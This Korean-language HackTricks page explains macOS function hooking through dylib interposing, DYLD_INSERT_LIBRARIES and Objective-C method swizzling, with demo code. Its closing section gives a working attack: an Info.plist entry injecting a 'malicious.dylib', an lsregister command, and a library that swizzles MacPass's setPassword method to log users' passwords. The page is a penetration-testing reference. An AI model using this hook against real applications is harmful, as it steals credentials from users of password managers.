# macOS Function Hooking

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 함수 Interposing

**원본** 함수와 **대체** 함수를 참조하는 **함수 포인터**의 튜플을 포함하는 **`__interpose`** 섹션(또는 **`S_INTERPOSING`** 플래그가 지정된 섹션)이 있는 **dylib**를 생성합니다.

그런 다음, \*\*`DYLD_INSERT_LIBRARIES`**를 사용하여 dylib를 주입합니다(Interposing은 주 앱이 로드되기 전에 발생해야 합니다). 물론, \[**`DYLD_INSERT_LIBRARIES`\*\*의 사용에 적용되는 [**제한 사항**](macos-library-injection/#check-restrictions)도 여기에 적용됩니다].

### printf Interpose

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

typedef int (*orig_open_type)(const char *pathname, int flags);
typedef FILE *(*orig_fopen_type)(const char *pathname, const char *mode);

int open(const char *pathname, int flags) {
    orig_open_type orig_open;
    orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
    printf("Opening file: %s\n", pathname);
    return orig_open(pathname, flags);
}

FILE *fopen(const char *pathname, const char *mode) {
    orig_fopen_type orig_fopen;
    orig_fopen = (orig_fopen_type)dlsym(RTLD_NEXT, "fopen");
    printf("Opening file: %s\n", pathname);
    return orig_fopen(pathname, mode);
}
```

이 코드는 `open` 및 `fopen` 함수를 후킹하여 파일이 열릴 때마다 해당 파일의 경로를 출력합니다. `dlsym` 함수를 사용하여 원래 함수에 대한 포인터를 가져온 다음, 후킹 함수에서 해당 원래 함수를 호출하고 경로를 출력합니다. 이렇게 함으로써 파일이 열릴 때마다 경로를 확인할 수 있습니다.

```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```

## 메소드 스위즐링

ObjectiveC에서 메소드는 다음과 같이 호출됩니다: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

**객체**, **메소드**, **파라미터**가 필요합니다. 그리고 메소드가 호출되면 **`objc_msgSend`** 함수를 사용하여 **메시지가 전송**됩니다: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

객체는 **`someObject`**, 메소드는 **`@selector(method1p1:p2:)`**, 인자는 **value1**, **value2**입니다.

객체 구조를 따라가면 메소드의 **이름**과 **메소드 코드의 포인터**가 **위치**한 **메소드 배열**에 도달할 수 있습니다.

{% hint style="danger" %}
메소드와 클래스는 이름을 기반으로 액세스되므로 이 정보는 바이너리에 저장되어 있으므로 `otool -ov </path/bin>` 또는 [`class-dump </path/bin>`](https://github.com/nygard/class-dump)을 사용하여 검색할 수 있습니다.
{% endhint %}

### 원시 메소드에 액세스하기

다음 예제와 같이 메소드의 정보(이름, 파라미터 수, 주소 등)에 액세스할 수 있습니다:

```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```

### method\_exchangeImplementations을 사용한 메소드 스위즐링

함수 \*\*`method_exchangeImplementations`\*\*은 **다른 함수의 구현**의 **주소**를 **변경**하는 것을 가능하게 합니다.

{% hint style="danger" %}
따라서 함수가 호출될 때 **다른 함수가 실행**됩니다.
{% endhint %}

```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```

{% hint style="warning" %}
이 경우, **합법적인** 메소드의 **구현 코드**가 **메소드 이름**을 확인한다면, 이 스위즐링을 감지하고 실행을 방지할 수 있습니다.

다음 기술에는 이러한 제한이 없습니다.
{% endhint %}

### method\_setImplementation을 사용한 메소드 스위즐링

이전 형식은 이상합니다. 왜냐하면 한 메소드의 구현을 다른 메소드로 변경하고 있기 때문입니다. **`method_setImplementation`** 함수를 사용하여 한 메소드의 구현을 다른 메소드로 **변경**할 수 있습니다.

새로운 구현에서 이전 구현을 호출할 경우, 나중에 해당 주소를 찾기가 훨씬 복잡해지므로, **원래 구현의 주소를 저장**해 두는 것을 기억하세요.

```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```

## 후킹 공격 방법론

이 페이지에서는 함수 후킹하는 다양한 방법에 대해 논의되었습니다. 그러나 이들은 **프로세스 내에서 코드를 실행하여 공격**하는 것을 포함합니다.

이를 위해 가장 쉬운 기술은 [환경 변수 또는 하이재킹을 통한 Dyld 주입](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)을 사용하는 것입니다. 그러나 [Dylib 프로세스 주입](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)을 통해서도 이를 수행할 수 있다고 생각합니다.

그러나 두 가지 옵션 모두 **보호되지 않은** 이진 파일/프로세스에 **제한**이 있습니다. 제한 사항에 대해 자세히 알아보려면 각 기술을 확인하십시오.

그러나 함수 후킹 공격은 매우 특정한 공격입니다. 공격자는 이를 통해 프로세스 내에서 **민감한 정보를 탈취**할 것입니다 (그렇지 않다면 프로세스 주입 공격을 수행할 것입니다). 이러한 민감한 정보는 MacPass와 같은 사용자가 다운로드한 앱에 위치할 수 있습니다.

따라서 공격자는 취약점을 찾거나 애플리케이션의 서명을 제거하여 애플리케이션의 Info.plist를 통해 **`DYLD_INSERT_LIBRARIES`** 환경 변수를 주입할 것입니다. 다음과 같이 추가합니다:

```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```

그런 다음 **애플리케이션을 다시 등록**합니다:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

해당 라이브러리에 정보를 유출하기 위한 후킹 코드를 추가합니다: 비밀번호, 메시지...

{% hint style="danger" %}
macOS의 최신 버전에서는 애플리케이션 이진 파일의 서명을 제거하고 이전에 실행되었다면, macOS는 해당 애플리케이션을 더 이상 실행하지 않습니다.
{% endhint %}

#### 라이브러리 예제

```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```

## 참고 자료

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기교를 공유하세요.

</details>
